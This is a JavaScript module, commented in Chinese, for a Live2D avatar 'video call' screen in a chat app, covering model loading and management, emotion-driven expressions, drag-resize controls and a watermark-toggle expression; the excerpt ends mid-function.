/**
 * Live2D 视频通话模块（ElainaChat 扩展）
 * - 全屏通话界面：加载 Live2D 模型
 * - AI 说话时嘴部同步（LipSync）
 * - LLM 输出 [表情:xxx] / [动作:xxx] 标签 → 驱动模型表情/动作
 * - 模型外挂：应用内上传 zip，服务端存 web/live2d/models/（gitignore 不入库）
 */
(function () {
  'use strict';

  let app = null;
  let model = null;
  let container = null;
  let isOpen = false;
  let speaking = false;
  let mouthEnergy = 1; // 情绪驱动的说话嘴型幅度（激动大/平静小）
  let rafRunning = false;
  let currentExpression = null;
  let modelsList = [];
  let selectedModel = '';
  let currentModelExps = [];   // 当前模型可用表情文件名（.exp3.json，供 AI 决策）
  let currentModelMotions = []; // 当前模型可用动作文件名（.motion3.json，供 AI 决策）
  // 清单是否已从服务端拿到（区分"未知"与"确定为空"，见 resolveExpressionFile）
  let modelAssetListKnown = false;
  // 模型尺寸/位置状态（图片网格式拖拽调整）
  //   sx/sy: 模型绝对缩放倍数（PIXI scale；模型单位高约 1~2，旧版同语义）
  //   cx/cy: 模型中心在屏幕上的位置比例（0~1）
  // 每个模型独立记忆（live2d.resize.<模型名>），兼容旧版全局 live2d.resize / live2d.scale
  let resizeState = { sx: 1, sy: 1, cx: 0.5, cy: 0.5 };
  let legacyScaleHint = null; // 旧版 live2d.scale（高度占屏幕比例）迁移用
  let needsInitScale = false; // 首次使用：按高度 65% 自适应
  // 水印开关（通用探测：模型 exp 目录含"水印"的表情，如 悠小喵「水印开关」Param85=1）
  let watermarkExp = null;   // 探测到的水印开关表情文件名（如 水印开关.exp3.json）
  let watermarkParamId = null; // 该表情设置的参数 Id（如 Param85）
  let watermarkValue = 1;    // 该表情设置的参数值（隐藏水印的值，默认 1）
  let watermarkOn = false;   // 当前水印是否已隐藏
  let watermarkKeyHandler = null; // 键盘监听引用（open/close 挂载/卸载）
  // 鼠标追踪（模型头部/眼睛跟随鼠标）
  let mouseTarget = { x: 0, y: 0 };
  let mouseCurrent = { x: 0, y: 0 };
  let mouseTrackRaf = null;
  let mouseMoveHandler = null;
  // 语音音量（VAD）：真实 TTS 音量驱动嘴型（null = 用正弦波模拟）
  let voiceEnergy = null;

  function resizeStorageKey() { return selectedModel ? 'live2d.resize.' + selectedModel : 'live2d.resize'; }

  function sanitizeResize(o) {
    const s = {};
    // 只做宽范围防垃圾值，精确钳制在 applyModelSize 里按屏幕/模型动态计算
    s.sx = isFinite(o.sx) && o.sx > 0 ? Math.min(1e6, Math.max(1e-4, o.sx)) : 1;
    s.sy = isFinite(o.sy) && o.sy > 0 ? Math.min(1e6, Math.max(1e-4, o.sy)) : s.sx;
    s.cx = isFinite(o.cx) ? Math.min(1, Math.max(0, o.cx)) : 0.5;
    s.cy = isFinite(o.cy) ? Math.min(1, Math.max(0, o.cy)) : 0.5;
    return s;
  }

  function loadResizeState() {
    // 1) 当前模型专属
    if (selectedModel) {
      try {
        const raw = localStorage.getItem('live2d.resize.' + selectedModel);
        if (raw) {
          const o = JSON.parse(raw);
          if (o && isFinite(o.sx) && o.sx > 0) return sanitizeResize(o);
        }
      } catch { /* ignore */ }
    }
    // 2) 旧版全局（本次改造前的 live2d.resize）
    try {
      const raw = localStorage.getItem('live2d.resize');
      if (raw) {
        const o = JSON.parse(raw);
        if (o && isFinite(o.sx) && o.sx > 0) return sanitizeResize(o);
      }
    } catch { /* ignore */ }
    // 3) 旧版 live2d.scale = 高度占屏幕比例（0.2~1.2），迁移到新格式
    try {
      const old = parseFloat(localStorage.getItem('live2d.scale'));
      if (isFinite(old) && old > 0) {
        legacyScaleHint = Math.min(1.2, Math.max(0.2, old));
        return { sx: 1, sy: 1, cx: 0.5, cy: 0.5 };
      }
    } catch { /* ignore */ }
    needsInitScale = true;
    return { sx: 1, sy: 1, cx: 0.5, cy: 0.5 };
  }

  function saveResizeState() {
    try { localStorage.setItem(resizeStorageKey(), JSON.stringify(resizeState)); } catch { /* ignore */ }
  }

  // 模型在 scale=1 时的自然包围盒（模型单位，高度约 1~2）
  function modelUnitBounds() {
    try {
      const b = model.getLocalBounds();
      if (b.width > 0 && b.height > 0 && isFinite(b.width) && isFinite(b.height)) return { w: b.width, h: b.height };
    } catch { /* ignore */ }
    try {
      const im = model.internalModel;
      if (im && isFinite(im.width) && im.width > 0 && isFinite(im.height) && im.height > 0) return { w: im.width, h: im.height };
    } catch { /* ignore */ }
    return null;
  }

  // 动态钳制：渲染高度限制在屏幕高的 2%~600%
  function clampScale(v) {
    if (!isFinite(v) || v <= 0) return 0.01;
    let min = 0.01, max = 100;
    if (model && app && app.screen.height > 0) {
      const u = modelUnitBounds();
      if (u && u.h > 0) {
        min = (0.02 * app.screen.height) / u.h;
        max = (6 * app.screen.height) / u.h;
      }
    }
    return Math.min(max, Math.max(min, v));
  }

  const EXPRESSION_MAP = {
    happy: '星星眼', sad: '哭哭', blush: '脸红', dizzy: '晕晕眼', angry: '黑脸',
    think: '前倾', smile: '常规', cry: '流泪', shy: '扶脸', phone: '看手机',
    note: '记笔记', fly: '飞头',
  };
  const MOTION_MAP = { wave: '常规', bow: '前倾' };

  // 情绪系统：情绪 → 表情 + 说话嘴型幅度 + 触发词/emoji（用于无标签时自动推断）
  // LLM 回复可用 [情绪:xxx] 显式驱动；未带标签时按触发词自动推断
  const EMOTION_MAP = {
    happy: { exp: 'happy', energy: 1.2, keys: ['开心', '高兴', '哈哈', '太好了', '太棒了', '真棒', '真开心', '喜欢', '笑死', '不错嘛', '好耶', '开心', '😄', '😆', '🥳', '😊', '🎉'] },
    sad: { exp: 'sad', energy: 0.65, keys: ['难过', '伤心', '呜呜', '想哭', '悲伤', '遗憾', '不开心', '好难过', '失落', '😢', '😭', '💔'] },
    angry: { exp: 'angry', energy: 1.35, keys: ['生气', '愤怒', '哼', '讨厌', '可恶', '气死', '真气人', '烦死了', '😡', '😠', '💢'] },
    shy: { exp: 'blush', energy: 0.85, keys: ['害羞', '脸红', '不好意思', '讨厌啦', '别这样', '难为情', '😳', '🥰'] },
    surprised: { exp: 'dizzy', energy: 1.4, keys: ['惊讶', '震惊', '哇', '居然', '不会吧', '天哪', '真的假的', '😮', '😱', '🤯'] },
    cry: { exp: 'cry', energy: 0.55, keys: ['委屈', '哭唧唧', '泪流', '哇哇哭'] },
    think: { exp: 'think', energy: 0.8, keys: ['思考', '想想', '让我想想', '嗯…', '嗯...', '让我想想', '🤔'] },
    dizzy: { exp: 'dizzy', energy: 0.7, keys: ['晕', '头晕', '天旋地转', '😵'] },
    calm: { exp: 'smile', energy: 1.0, keys: ['平静', '嗯嗯', '好的', '没事', '放心', '😌'] },
  };

  // ===== DOM =====
  function buildUI() {
    const host = document.createElement('div');
    host.id = 'live2d-call-host';
    host.innerHTML = `
      <div id="live2d-stage" class="live2d-stage">
        <div class="live2d-topbar">
          <div class="live2d-model-select">
            <select id="live2d-model-select" title="切换模型"></select>
          </div>
        </div>
        <div id="live2d-canvas-wrap" class="live2d-canvas-wrap">
          <canvas id="live2d-canvas"></canvas>
          <div class="live2d-name-tag" id="live2d-name-tag">视频通话中</div>
          <div class="live2d-follow-hint" id="live2d-follow-hint" title="点击开启鼠标跟随">鼠标跟随已关闭 · 点此开启</div>
          <div class="live2d-mute-hint" id="live2d-mute-hint" title="AI 语音已静音（可由 AI 用 [操作:取消静音] 恢复）">AI 声音已静音</div>
          <div class="live2d-speaking-indicator" id="live2d-speaking">🔊 正在说话…</div>
          <div id="live2d-resize-box" class="live2d-resize-box" title="拖动移动 · 拖手柄调整大小">
            <div class="live2d-handle" data-dir="nw"></div>
            <div class="live2d-handle" data-dir="n"></div>
            <div class="live2d-handle" data-dir="ne"></div>
            <div class="live2d-handle" data-dir="e"></div>
            <div class="live2d-handle" data-dir="se"></div>
            <div class="live2d-handle" data-dir="s"></div>
            <div class="live2d-handle" data-dir="sw"></div>
            <div class="live2d-handle" data-dir="w"></div>
          </div>
        </div>
        <div class="live2d-bottombar">
          <button id="live2d-talk-btn" class="live2d-mic-btn" title="语音输入：点击开始说话，说完再点一次发送">🎤 说话</button>
          <button id="live2d-adjust-toggle" class="live2d-adjust-btn" title="显示/隐藏模型调整框">📐</button>
          <button id="live2d-end-btn" class="live2d-end-btn" title="结束通话">📞 挂断</button>
        </div>
      </div>
    `;
    document.body.appendChild(host);

    const style = document.createElement('style');
    style.textContent = `
      /* 兼容旧 WebView（Chromium < 87 不支持 inset 简写）：用长属性兜底，避免通话浮层定位失效飘到左上角 */
      #live2d-call-host { position: fixed; top: 0; right: 0; bottom: 0; left: 0; z-index: 950; display: none; }
      #live2d-call-host.open { display: block; }
      .live2d-stage { width: 100%; height: 100%; background: #0b0e14; position: relative; overflow: hidden; }
      .live2d-topbar { position: absolute; top: 0; left: 0; right: 0; padding: 12px 16px; display: flex; align-items: center; gap: 10px; z-index: 5; background: linear-gradient(rgba(0,0,0,.45), transparent); }
      .live2d-model-select { display: flex; align-items: center; gap: 6px; margin-left: auto; }
      .live2d-model-select select { background: rgba(255,255,255,.14); color: #fff; border: none; border-radius: 8px; padding: 5px 8px; font-size: 12px; max-width: 140px; outline: none; }
      .live2d-model-select select option { color: #222; }
      .live2d-canvas-wrap { position: absolute; top: 0; right: 0; bottom: 0; left: 0; }
      #live2d-canvas { width: 100%; height: 100%; display: block; }
      .live2d-name-tag { position: absolute; bottom: 84px; left: 50%; transform: translateX(-50%); color: rgba(255,255,255,.85); font-size: 13px; background: rgba(0,0,0,.4); padding: 4px 14px; border-radius: 999px; white-space: nowrap; }
      .live2d-speaking-indicator { position: absolute; top: 56px; left: 50%; transform: translateX(-50%); color: #7dd3fc; font-size: 13px; display: none; background: rgba(0,0,0,.5); padding: 5px 14px; border-radius: 999px; }
      .live2d-speaking-indicator.on { display: block; }
      /* 鼠标跟随关闭时的提示：让"模型不动"这件事自解释，而不是让人以为模型坏了 */
      .live2d-follow-hint { position: absolute; bottom: 132px; left: 50%; transform: translateX(-50%); color: #fcd34d; font-size: 12px; display: none; background: rgba(0,0,0,.55); padding: 5px 14px; border-radius: 999px; cursor: pointer; z-index: 6; white-space: nowrap; }
      .live2d-follow-hint.on { display: block; }
      /* 静音提示：静音这个状态以前完全没有界面反馈（它引用的按钮早已被移除） */
      .live2d-mute-hint { position: absolute; bottom: 170px; left: 50%; transform: translateX(-50%); color: #fca5a5; font-size: 12px; display: none; background: rgba(0,0,0,.55); padding: 5px 14px; border-radius: 999px; z-index: 6; white-space: nowrap; }
      .live2d-mute-hint.on { display: block; }
      .live2d-bottombar { position: absolute; bottom: 0; left: 0; right: 0; padding: 16px 20px calc(20px + env(safe-area-inset-bottom)); display: flex; gap: 14px; justify-content: center; align-items: center; z-index: 5; background: linear-gradient(transparent, rgba(0,0,0,.55)); }
      .live2d-mic-btn { background: rgba(255,255,255,.14); border: none; color: #fff; width: 54px; height: 54px; border-radius: 50%; cursor: pointer; font-size: 12px; font-weight: 600; transition: all .15s; }
      .live2d-mic-btn:hover { background: rgba(255,255,255,.28); }
      .live2d-mic-btn.listening { background: rgba(239,68,68,.78); box-shadow: 0 0 0 3px rgba(239,68,68,.45); animation: live2d-mic-pulse 1.2s ease-in-out infinite; }
      @keyframes live2d-mic-pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
      .live2d-adjust-btn { background: rgba(255,255,255,.14); border: none; color: #fff; width: 54px; height: 54px; border-radius: 50%; font-size: 22px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all .15s; }
      .live2d-adjust-btn:hover { background: rgba(255,255,255,.28); }
      .live2d-adjust-btn.active { background: rgba(129,199,255,.35); color: #fff; box-shadow: 0 0 0 2px rgba(129,199,255,.7); }
      .live2d-end-btn { background: #ef4444; border: none; color: #fff; padding: 10px 22px; border-radius: 999px; font-size: 14px; cursor: pointer; }
      .live2d-end-btn:hover { background: #dc2626; }
      .live2d-bg-panel { position: absolute; top: 52px; left: 50%; transform: translateX(-50%); z-index: 6; background: rgba(20,22,35,.92); border: 1px solid rgba(255,255,255,.12); border-radius: 14px; padding: 14px 16px; width: 320px; backdrop-filter: blur(10px); }
      .live2d-bg-panel.hidden { display: none; }
      .live2d-bg-head { color: #fff; font-size: 13px; font-weight: 600; margin-bottom: 10px; }
      .live2d-bg-section { margin-bottom: 10px; }
      .live2d-bg-title { color: rgba(255,255,255,.65); font-size: 11px; margin-bottom: 6px; }
      .live2d-bg-options { display: flex; flex-wrap: wrap; gap: 8px; }
      .live2d-bg-swatch { width: 36px; height: 36px; border-radius: 10px; cursor: pointer; border: 2px solid rgba(255,255,255,.15); position: relative; transition: transform .12s; }
      .live2d-bg-swatch:hover { transform: scale(1.1); border-color: #fff; }
      .live2d-bg-custom { display: flex; align-items: center; justify-content: center; font-size: 16px; background: rgba(255,255,255,.08); }
      /* 模型调整框：虚线边框 + 8 个拖拽手柄（默认隐藏，点「调整」按钮开关） */
      .live2d-resize-box { position: absolute; z-index: 4; border: 1.5px dashed rgba(255,255,255,.6); box-sizing: border-box; display: none; cursor: move; touch-action: none; }
      .live2d-resize-box.show { display: block; }
      .live2d-resize-box.resizing { border-style: solid; border-color: rgba(129,199,255,.9); }
      .live2d-handle { position: absolute; width: 12px; height: 12px; background: #fff; border: 1.5px solid #0b0e14; border-radius: 3px; box-shadow: 0 0 4px rgba(0,0,0,.5); box-sizing: border-box; touch-action: none; }
      .live2d-handle[data-dir="nw"] { top: -7px; left: -7px; cursor: nwse-resize; }
      .live2d-handle[data-dir="n"] { top: -7px; left: 50%; margin-left: -6px; cursor: ns-resize; }
      .live2d-handle[data-dir="ne"] { top: -7px; right: -7px; cursor: nesw-resize; }
      .live2d-handle[data-dir="e"] { top: 50%; margin-top: -6px; right: -7px; cursor: ew-resize; }
      .live2d-handle[data-dir="se"] { bottom: -7px; right: -7px; cursor: nwse-resize; }
      .live2d-handle[data-dir="s"] { bottom: -7px; left: 50%; margin-left: -6px; cursor: ns-resize; }
      .live2d-handle[data-dir="sw"] { bottom: -7px; left: -7px; cursor: nesw-resize; }
      .live2d-handle[data-dir="w"] { top: 50%; margin-top: -6px; left: -7px; cursor: ew-resize; }
      .live2d-handle:hover { background: #bde0ff; }
      .live2d-adjust-btn.active { background: rgba(129,199,255,.35); color: #fff; box-shadow: 0 0 0 2px rgba(129,199,255,.7); }
    `;
    document.head.appendChild(style);

    host.querySelector('#live2d-end-btn').addEventListener('click', close);
    host.querySelector('#live2d-talk-btn').addEventListener('click', toggleTalk);
    host.querySelector('#live2d-model-select').addEventListener('change', (e) => {
      selectedModel = e.target.value;
      if (isOpen) void loadModel();
    });
    host.querySelector('#live2d-adjust-toggle').addEventListener('click', toggleAdjustBox);
    // 「鼠标跟随已关闭」提示：点击直接开启，避免用户误以为是模型不支持
    const followHint = host.querySelector('#live2d-follow-hint');
    if (followHint) followHint.addEventListener('click', () => setMouseFollow(true));
    // 注意：鼠标追踪监听器不在这里挂载（buildUI 只在首次打开时执行一次），
    // 否则 close() 移除监听后再次打开通话将永远不会重新挂载 —— 见 ensureMouseTracking()

    // 调整框拖拽：手柄缩放 / 框内移动
    const box = host.querySelector('#live2d-resize-box');
    box.querySelectorAll('.live2d-handle').forEach(h => {
      h.addEventListener('pointerdown', (e) => {
        e.preventDefault();
        e.stopPropagation();
        startDrag(e, 'resize', h.dataset.dir);
      });
    });
    box.addEventListener('pointerdown', (e) => {
      e.preventDefault();
      startDrag(e, 'move', '');
    });
    box.addEventListener('pointermove', (e) => {
      if (!dragState) return;
      e.preventDefault();
      moveDrag(e);
    });
    const endDragHandler = () => endDrag();
    box.addEventListener('pointerup', endDragHandler);
    box.addEventListener('pointercancel', endDragHandler);
    box.addEventListener('lostpointercapture', endDragHandler);
  }

  // ===== 模型管理 =====
  async function refreshModelList() {
    // APK 首次启动会把打包进来的内置模型复制到应用数据目录（见 index.html）。
    // 种的过程还没结束时先等一下，否则刚装好打开通话会看到"未上传模型"。
    if (window.__nativeSeedPromise) {
      try { await window.__nativeSeedPromise; } catch { /* 种失败不影响用户自己上传的模型 */ }
    }
    try {
      const res = await fetch('/api/live2d/models');
      const json = await res.json();
      modelsList = (json.models || []).filter(m => m && m.name);
    } catch (err) {
      console.warn('[Live2D] 获取模型列表失败:', err.message || err);
      modelsList = [];
    }
    const sel = document.getElementById('live2d-model-select');
    if (!sel) return;
    sel.innerHTML = '';
    if (!modelsList.length) {
      sel.innerHTML = '<option value="">（未上传模型）</option>';
    } else {
      for (const m of modelsList) {
        const opt = document.createElement('option');
        opt.value = m.name;          // 目录名即显示名（设置里可重命名）
        opt.textContent = m.name;
        sel.appendChild(opt);
      }
      if (!selectedModel || !modelsList.some(m => m.name === selectedModel)) selectedModel = modelsList[0].name;
      sel.value = selectedModel;
    }
  }

  function getSelectedModelInfo() {
    return modelsList.find(m => m.name === selectedModel) || null;
  }

  /**
   * 服务端把模型【目录】改名后，同步客户端这边所有按模型名存的东西。
   * 目录名是"每模型设置"的 key，不迁移的话改名后模型会回到默认大小、水印开关也会丢。
   * 顺带把 selectedModel 指到新名字，否则下拉会掉选到第一个模型。
   */
  function applyRenamedModel(oldName, newName) {
    if (!oldName || !newName || oldName === newName) return Promise.resolve();
    if (selectedModel === oldName) selectedModel = newName;
    try {
      for (const prefix of ['live2d.resize.', 'live2d.wm.']) {
        const v = localStorage.getItem(prefix + oldName);
        if (v !== null) {
          localStorage.setItem(prefix + newName, v);
          localStorage.removeItem(prefix + oldName);
        }
      }
    } catch { /* ignore */ }
    return refreshModelList();
  }

  // 模型资源基础 URL：Web 版走服务端 /live2d/models/；Capacitor（APK）走本地文件系统
  function modelBaseUrl(name) {
    const isNative = !!(window.Capacitor && window.Capacitor.isNativePlatform && window.Capacitor.isNativePlatform());
    const base = (isNative && window.__nativeModelBase) ? window.__nativeModelBase : '/live2d/models/';
    return base + encodeURIComponent(name) + '/';
  }

  /**
   * 拼出模型内某个资源的完整 URL。
   * relPath 是「相对模型根目录」的路径，由 /api/live2d/models 返回，可能带子目录
   * （如 `motions/idle.motion3.json`、`exp/脸红.exp3.json`，也可能就是根目录下的
   * `脸红.exp3.json`）。
   *
   * 历史包袱：这里原来一律写成 `modelBaseUrl(name) + 'exp/' + 文件名`，即假定每个模型
   * 都把表情和动作放在 exp/ 子目录里。但这不是 Cubism 的规范，只是某几个模型的个人习惯——
   * 仓库内置的 deepseek 把 50 多个 *.exp3.json 直接堆在模型根目录、动作放在 motions/，
   * 于是它的表情/动作请求全部 404，表现出来就是"打包进去的模型没有表情"。
   * 现在改为按清单里的真实相对路径拼，exp/ 约定照样兼容。
   *
   * 注意逐段编码：整串 encodeURIComponent 会把路径分隔符也编成 %2F，服务端就找不到文件了。
   */
  function modelAssetUrl(name, relPath) {
    const rel = String(relPath || '').split('/').filter(Boolean).map(encodeURIComponent).join('/');
    return modelBaseUrl(name) + rel;
  }

  async function deleteModel(name) {
    if (!name) return;
    if (!window.confirm('确定删除模型「' + name + '」？此操作不可恢复。')) return;
    try {
      const res = await fetch('/api/live2d/models/' + encodeURIComponent(name), { method: 'DELETE' });
      const json = await res.json();
      if (json.ok) {
        // 清理该模型保存的尺寸/位置与水印记忆
        try {
          localStorage.removeItem('live2d.resize.' + name);
          localStorage.removeItem('live2d.wm.' + name);
        } catch { /* ignore */ }
        if (selectedModel === name) selectedModel = '';
        await refreshModelList();
        if (isOpen) {
          if (modelsList.length) await loadModel();
          else {
            const tag = document.getElementById('live2d-name-tag');
            if (tag) tag.textContent = '未上传模型，请到「设置 → Live2D」上传 zip';
          }
        }
        return true;
      }
      window.alert('删除失败：' + (json.message || '未知错误'));
      return false;
    } catch (err) {
      window.alert('删除失败：' + (err.message || err));
      return false;
    }
  }

  // ===== 水印开关（通用探测，由 AI 通过 [操作:隐藏水印/显示水印] 控制，无手动按钮） =====
  // 很多免费 Live2D 模型（如 悠小喵/泠）内置"水印"部件，作者在 VTube Studio 里绑定数字键
  // （如 悠小喵=1、泠=0）触发一个"水印开关"表情（如 水印开关.exp3.json → Param85=1）来隐藏水印。
  // 这里通用探测：模型 exp 目录文件名含"水印/watermark"的表情即视为水印开关。

  async function detectWatermark(info) {
    watermarkExp = null;
    watermarkParamId = null;
    watermarkValue = 1;
    watermarkOn = false;
    if (!info || !Array.isArray(info.exps) || !info.exps.length) return;
    const hit = info.exps.find(f => /水印|watermark|wm开关|water_mark/i.test(f));
    if (!hit) return;
    watermarkExp = hit;
    // 读取表情内容，拿到它设置的参数 Id 与隐藏值（用于直接驱动参数，比 expression 播放更可靠）
    try {
      const res = await fetch(modelAssetUrl(selectedModel, hit));
      const json = await res.json();
      const p = json && Array.isArray(json.Parameters) ? json.Parameters[0] : null;
      if (p && p.Id) {
        watermarkParamId = p.Id;
        if (p.Value != null) watermarkValue = p.Value;
      }
    } catch { /* ignore */ }
    // 恢复上次记忆：该模型之前隐藏过水印（AI 触发后记忆，下次打开自动恢复隐藏）
    try {
      if (localStorage.getItem('live2d.wm.' + selectedModel) === '1') {
        watermarkOn = true;
        if (model) applyWatermark();
      }
    } catch { /* ignore */ }
  }

  // 按当前 watermarkOn 状态直接驱动参数（setParameterValueById 比 expression 播放更可靠）
  function applyWatermark() {
    if (!model || !watermarkExp) return;
    try {
      const coreModel = model.internalModel?.coreModel;
      if (watermarkParamId && coreModel && typeof coreModel.setParameterValueById === 'function') {
        coreModel.setParameterValueById(watermarkParamId, watermarkOn ? watermarkValue : 0);
        return;
      }
      // 兜底：无参数信息时用表情播放
      if (watermarkOn) {
        void model.expression(modelAssetUrl(selectedModel, watermarkExp));
      } else {
        void model.expression();
      }
    } catch (err) {
      console.warn('[Live2D] 水印开关应用失败:', err);
    }
  }

  async function toggleWatermark() {
    if (!model || !watermarkExp) return;
    watermarkOn = !watermarkOn;
    applyWatermark();
    try { localStorage.setItem('live2d.wm.' + selectedModel, watermarkOn ? '1' : '0'); } catch { /* ignore */ }
  }

  function onWatermarkKeyDown(e) {
    if (!isOpen || !watermarkExp) return;
    if (e.key === '1' || e.key === '0' || e.code === 'Digit1' || e.code === 'Digit0' || e.code === 'Numpad1' || e.code === 'Numpad0') {
      e.preventDefault();
      void toggleWatermark();
    }
  }

  // ===== 模型调整框（通话界面，开关按钮控制） =====
  let dragState = null; // 当前拖拽：{mode:'move'|'resize', dir, px, py, sx0, sy0, cx0, cy0, dist0}
  let adjustBoxVisible = false;

  function toggleAdjustBox() {
    adjustBoxVisible = !adjustBoxVisible;
    const box = document.getElementById('live2d-resize-box');
    const btn = document.getElementById('live2d-adjust-toggle');
    if (btn) btn.classList.toggle('active', adjustBoxVisible);
    if (box) box.classList.toggle('show', adjustBoxVisible);
    if (adjustBoxVisible) updateResizeBox();
  }

  // canvas 内部分辨率 → CSS 像素 的缩放因子（PIXI 世界坐标是内部像素，
  // 若与 CSS 尺寸不一致，直接用作 left/top 会偏移 → 乘该因子校正）
  function canvasPixelScale() {
    const canvas = document.getElementById('live2d-canvas');
    if (canvas && canvas.width > 0 && canvas.clientWidth > 0) {
      return canvas.clientWidth / canvas.width;
    }
    return 1;
  }

  function updateResizeBox() {
    const box = document.getElementById('live2d-resize-box');
    if (!box || !box.classList.contains('show')) return;
    if (!model || !app) return;
    let b;
    try { b = model.getBounds(); } catch { return; }
    if (!isFinite(b.x) || !isFinite(b.y) || !isFinite(b.width) || !isFinite(b.height) || b.width <= 0 || b.height <= 0) return;
    const k = canvasPixelScale();
    box.style.left = (b.x * k) + 'px';
    box.style.top = (b.y * k) + 'px';
    box.style.width = (b.width * k) + 'px';
    box.style.height = (b.height * k) + 'px';
  }

  function resizeCenter() {
    // 模型中心：resizeState 存的是 canvas 内部像素比例，而鼠标事件 clientX/Y 是 CSS 像素，
    // 两者必须统一到 CSS 像素（canvasPixelScale 换算），否则分辨率不一致时拖拽会偏。
    const k = canvasPixelScale();
    return { x: resizeState.cx * app.screen.width * k, y: resizeState.cy * app.screen.height * k };
  }

  function startDrag(e, mode, dir) {
    if (!model || !app) return;
    dragState = {
      mode, dir,
      px: e.clientX, py: e.clientY,
      sx0: resizeState.sx, sy0: resizeState.sy,
      cx0: resizeState.cx, cy0: resizeState.cy,
    };
    const c = resizeCenter();
    dragState.dist0 = Math.max(1, Math.hypot(e.clientX - c.x, e.clientY - c.y));
    const box = document.getElementById('live2d-resize-box');
    if (box) box.classList.add('resizing');
    try { (e.target || box).setPointerCapture(e.pointerId); } catch { /* ignore */ }
  }

  function moveDrag(e) {
    if (!dragState || !model || !app) return;
    const st = dragState;
    const c = resizeCenter();
    if (st.mode === 'move') {
      const dx = (e.clientX - st.px) / app.screen.width;
      const dy = (e.clientY - st.py) / app.screen.height;
      resizeState.cx = Math.min(1, Math.max(0, st.cx0 + dx));
      resizeState.cy = Math.min(1, Math.max(0, st.cy0 + dy));
    } else {
      const dir = st.dir;
      const hasX = dir.indexOf('e') >= 0 || dir.indexOf('w') >= 0;
      const hasY = dir.indexOf('n') >= 0 || dir.indexOf('s') >= 0;
      const free = e.shiftKey; // Shift = 自由拉伸（角手柄）
      if (hasX && hasY && !free) {
        // 等比缩放：以拖拽起点到模型中心距离为基准，sx/sy 按同一比例变化
        const k = Math.max(0.01, Math.hypot(e.clientX - c.x, e.clientY - c.y) / st.dist0);
        resizeState.sx = clampScale(st.sx0 * k);
        resizeState.sy = clampScale(st.sy0 * k);
      } else {
        // 单轴拉伸（边手柄）或 Shift 自由拉伸（角手柄）
        if (hasX) {
          const baseX = Math.max(1, Math.abs(st.px - c.x));
          const curX = Math.max(1, Math.abs(e.clientX - c.x));
          resizeState.sx = clampScale(st.sx0 * (curX / baseX));
        }
        if (hasY) {
          const baseY = Math.max(1, Math.abs(st.py - c.y));
          const curY = Math.max(1, Math.abs(e.clientY - c.y));
          resizeState.sy = clampScale(st.sy0 * (curY / baseY));
        }
      }
    }
    applyModelSize();
    updateResizeBox();
  }

  function endDrag() {
    if (!dragState) return;
    dragState = null;
    const box = document.getElementById('live2d-resize-box');
    if (box) box.classList.remove('resizing');
    saveResizeState();
  }

  // ===== 渲染 =====
  function waitForLive2D(timeoutMs = 8000) {
    return new Promise((resolve, reject) => {
      const start = Date.now();
      const check = () => {
        if (window.PIXI && window.PIXI.live2d && window.PIXI.live2d.Live2DModel) {
          resolve(true);
          return;
        }
        if (Date.now() - start > timeoutMs) {
          reject(new Error('Live2D 库加载超时（PIXI.live2d 不可用）'));
          return;
        }
        setTimeout(check, 200);
      };
      check();
    });
  }

  async function open() {
    if (isOpen) return;
    // 等待 Live2D 库就绪（库异步挂载，需轮询）
    try {
      await waitForLive2D();
    } catch (err) {
      window.alert('Live2D 库未加载成功：' + err.message + '。请强制刷新页面（Ctrl+F5）后重试。');
      console.error('[Live2D] PIXI.live2d 不可用:', window.PIXI ? Object.keys(window.PIXI) : 'PIXI 未加载');
      return;
    }
    isOpen = true;
    if (!container) buildUI();
    container = document.getElementById('live2d-call-host');
    container.classList.add('open');
    ensureMouseTracking();   // 每次打开都确保监听器在位（close 会移除）
    syncFollowHint();
    syncMuteHint();

    if (!app) {
      const canvas = document.getElementById('live2d-canvas');
      const wrap = document.getElementById('live2d-canvas-wrap');
      app = new PIXI.Application({
        view: canvas,
        autoStart: true,
        resizeTo: wrap,
        background: 0x0b0e14,
        antialias: true,
      });
    }
    // 关闭通话时会停掉 PIXI 的 ticker（避免后台空转渲染），这里恢复
    try { app?.ticker?.start?.(); } catch { /* ignore */ }
    // 必须在 app 创建之后才应用背景：否则首次打开时渲染器还是不透明底色，
    // 会把设置里保存的自定义背景/图片整个盖住（app 已存在时重复调用是幂等的）
    applyBackground();
    await refreshModelList();
    if (modelsList.length) await loadModel();
    else {
      const tag = document.getElementById('live2d-name-tag');
      if (tag) tag.textContent = '未上传模型，请到「设置 → Live2D」上传 zip';
    }
    // 键盘快捷键：1 / 0 切换水印（仅通话打开时）
    if (!watermarkKeyHandler) {
      watermarkKeyHandler = onWatermarkKeyDown;
      window.addEventListener('keydown', watermarkKeyHandler);
    }
  }

  // 鼠标跟随开关（设置 → Live2D），默认开启
  let mouseFollowEnabled = (function () {
    try { return localStorage.getItem('live2d.mouseFollow') !== '0'; } catch { return true; }
  })();

  // 鼠标跟随幅度（设置 → Live2D）。
  // 同一个"转头"参数在不同模型上的实际幅度差别很大：把 ParamAngleX 驱动到 20，
  // 有的模型几乎不动，有的整张脸都转过去了（实测两者可见像素变化相差约 7 倍）。
  // 所以幅度做成可调倍率：
  //   滑块 0-10 是标准范围，10 = 原始幅度 = 1.0 倍（保持旧行为）；
  //   输入框可以填更大的数字解锁更高倍率，上限 100 = 10 倍。
  // ⚠️ 但头部幅度被模型自身参数量程锁死（实测两个内置模型的转头参数都是 ±30，
  //   基础值 20 已用掉 2/3 → ×1.5 就到顶）。所以 ×1.0 以上由"身体跟随"接手补足，
  //   否则数字框填再大也是空转。详见 mouseTrackTick 里的 bodyK。
  const MOUSE_SCALE_MAX = 100;   // 倍率上限（=10 倍幅度）
  const MOUSE_SCALE_BASE = 10;   // 滑块满格 = 1.0 倍
  const BODY_GAIN_SPAN = 2;      // 倍率从 ×1.0 到 ×3.0 期间，身体跟随从 0 加到满量程
  let mouseFollowScale = (function () {
    try {
      const raw = localStorage.getItem('live2d.mouseFollowScale');
      if (raw === null) return MOUSE_SCALE_BASE; // 老用户没有这项配置，保持原来的幅度
      const v = Number(raw);
      return Number.isFinite(v) ? Math.max(0, Math.min(MOUSE_SCALE_MAX, Math.round(v))) : MOUSE_SCALE_BASE;
    } catch { return MOUSE_SCALE_BASE; }
  })();

  // 把头部/眼球/身体参数复位到中位（关闭跟随、幅度归零、关闭通话三处共用）
  function resetFollowParams() {
    const cm = model?.internalModel?.coreModel;
    if (!cm || typeof cm.setParameterValueById !== 'function') return;
    for (const slot of ['headX', 'headY', 'eyeBallX', 'eyeBallY', 'bodyX', 'bodyY']) {
